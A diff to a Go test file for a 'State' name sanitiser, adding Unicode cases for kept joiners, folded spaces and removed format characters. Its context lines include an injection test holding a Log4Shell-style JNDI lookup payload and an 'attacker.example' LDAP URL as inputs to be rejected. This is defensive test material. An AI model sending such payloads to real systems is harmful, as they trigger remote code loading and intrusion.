@@ -72,6 +72,17 @@ func TestState(t *testing.T) {
 		assert.Equal(t, txt.ClipName, len([]rune(got)))
 		assert.Equal(t, got, string([]rune(got)))
 	})
+	t.Run("JoinersKept", func(t *testing.T) {
+		assert.Equal(t, "\u0686\u0647\u0627\u0631\u0645\u200C\u0645\u062D\u0627\u0644", State("\u0686\u0647\u0627\u0631\u0645\u200C\u0645\u062D\u0627\u0644", "ir"))
+		assert.Equal(t, "\U0001F3F3\uFE0F\u200D\U0001F308 Pride", State("\U0001F3F3\uFE0F\u200D\U0001F308 Pride", ""))
+	})
+	t.Run("SpacesFolded", func(t *testing.T) {
+		assert.Equal(t, "Baden W\u00FCrttemberg", State("Baden\u00A0W\u00FCrttemberg", ""))
+		assert.Equal(t, "Baden W\u00FCrttemberg", State("Baden\u3000W\u00FCrttemberg", ""))
+	})
+	t.Run("FormatCharsRemoved", func(t *testing.T) {
+		assert.Equal(t, "Bayern", State("Bay\u202Eern\u200B", "de"))
+	})
 	t.Run("Injection", func(t *testing.T) {
 		assert.Equal(t, "", State("hello ${jndi:ldap://example.com/x}", ""))
 		assert.Equal(t, "", State("ldap://attacker.example/", ""))
